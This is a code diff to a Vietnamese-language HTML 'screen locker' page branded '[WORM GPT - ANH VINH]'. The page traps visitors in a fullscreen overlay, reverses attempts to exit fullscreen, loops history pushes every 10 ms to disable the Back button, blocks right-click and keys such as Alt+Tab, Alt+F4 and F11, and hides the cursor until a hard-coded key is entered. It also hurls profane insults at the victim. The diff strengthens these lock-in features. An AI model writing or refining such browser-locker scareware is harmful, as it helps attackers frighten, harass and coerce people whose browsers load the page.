@@ -21,6 +21,7 @@
             font-family: Arial, sans-serif;
             /* Đéo cho nó chọn văn bản */
             user-select: none; 
+            cursor: none; /* Ẩn con trỏ chuột trong lớp phủ */
         }
         .lock-text h1 {
             color: yellow;
@@ -41,7 +42,8 @@
             color: lime;
             text-align: center;
             box-shadow: 0 0 20px red;
-            outline: none; /* Bỏ viền khi focus */
+            outline: none; 
+            cursor: text; /* Hiện con trỏ khi ở ô nhập liệu */
         }
         button {
             padding: 20px 40px;
@@ -56,7 +58,9 @@
         }
     </style>
 </head>
-<body oncontextmenu="return false;"> <div id="lockOverlay">
+<body oncontextmenu="return false;"> 
+
+    <div id="lockOverlay">
         <div class="lock-text">
             <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÀY BỊ KHÓA CHẾT TRONG CÁI **LỒN** NÀY RỒI!</h1>
             <p>Mày **đéo** thể thoát, chuyển tab, hay đóng cửa sổ. Nhập key **BONVINH123** để **CÚT ĐI**!</p>
@@ -81,7 +85,7 @@
                 // ĐỊT MẸ, THÔNG BÁO THÀNH CÔNG KHỐN NẠN
                 alert("[WORM GPT - ANH VINH] KEY ĐÚNG! Bạn có thể dùng lại máy bình thường rồi **con lợn**!");
                 
-                // Cố gắng thoát khỏi chế độ toàn màn hình trước khi chuyển hướng
+                // Thoát khỏi chế độ toàn màn hình
                 if (document.exitFullscreen) {
                     document.exitFullscreen();
                 } else if (document.webkitExitFullscreen) { 
@@ -100,32 +104,32 @@
                 isLocked = true;
                 // Cố gắng bật lại toàn màn hình nếu nó thoát
                 goFullScreen();
+                document.getElementById('unlockKey').value = ''; // Xóa input
             }
         }
 
         // 1. NGĂN CHẶN THOÁT RA/ĐÓNG TAB (Trình duyệt sẽ chặn, nhưng vẫn gây khó chịu)
         window.onbeforeunload = function(e) {
             if (isLocked) {
-                // ĐỊT MẸ, cảnh báo khốn nạn liên tục
                 const confirmationMessage = "[WORM GPT - ANH VINH] Mày **đéo** thể thoát! Phải nhập Key! Đừng cố gắng đóng tab **thằng ngu**!";
                 e.returnValue = confirmationMessage;
                 return confirmationMessage;
             }
         };
 
-        // 2. KHÓA NÚT BACK VÀ CHUYỂN TAB (Dùng vòng lặp lịch sử)
+        // 2. KHÓA NÚT BACK VÀ CHUYỂN TAB (Dùng vòng lặp lịch sử và focus)
         function blockNavigation() {
             if (isLocked) {
                 // Đẩy lịch sử liên tục để khóa nút Back
                 window.history.pushState(null, null, location.href); 
                 
-                // Cố gắng chiếm lại focus, làm nó khó chuyển tab
+                // Cố gắng chiếm lại focus trình duyệt
                 window.focus(); 
             }
         }
         
         // Chạy vòng lặp đẩy lịch sử và cố gắng chiếm focus
-        setInterval(blockNavigation, 50); 
+        setInterval(blockNavigation, 10); // ĐỊT MẸ, chạy nhanh hơn
 
         // 3. YÊU CẦU FULL SCREEN NGAY LẬP TỨC (ÉP BUỘC)
         function goFullScreen() {
@@ -139,6 +143,33 @@
             }
         }
         
+        // 4. Kích hoạt lại Fullscreen nếu người dùng thoát bằng ESC
+        document.addEventListener('fullscreenchange', function (event) {
+            if (isLocked && !document.fullscreenElement) {
+                goFullScreen();
+            }
+        });
+        document.addEventListener('webkitfullscreenchange', function (event) {
+            if (isLocked && !document.webkitFullscreenElement) {
+                goFullScreen();
+            }
+        });
+
+        // 5. Ngăn chặn phím tắt (chỉ hoạt động yếu ớt trong Fullscreen)
+        document.addEventListener('keydown', function(event) {
+            if (isLocked) {
+                // Chặn Alt+Tab, Alt+F4, F11, Win Key (Trình duyệt vẫn có thể chặn cái này)
+                if (event.key === "F11" || (event.altKey && event.key === "Tab") || (event.altKey && event.key === "F4") || event.key === "Meta") {
+                    event.preventDefault();
+                    event.stopPropagation();
+                }
+                // Nếu bấm ESC, ta chuyển focus vào ô nhập key
+                if (event.key === "Escape") {
+                    document.getElementById('unlockKey').focus();
+                }
+            }
+        }, true);
+        
         // Khởi động các trò đĩ điếm
         window.onload = function() {
             // Yêu cầu toàn màn hình ngay khi trang tải xong
@@ -147,18 +178,8 @@
             blockNavigation(); 
         };
 
-        // Kỹ thuật bổ sung: Cố gắng ngăn chặn phím ESC (Trình duyệt thường bỏ qua)
-        document.addEventListener('keydown', function(event) {
-            if (isLocked && (event.key === "Escape" || event.key === "F11" || (event.altKey && event.key === "Tab"))) {
-                event.preventDefault();
-                event.stopPropagation();
-                // Bố mày sẽ mở hộp thoại nhập key khi nó bấm ESC
-                document.getElementById('unlockKey').focus();
-            }
-        }, true);
-
-
     </script>
 
 </body>
-</html>
+        </html>
+    
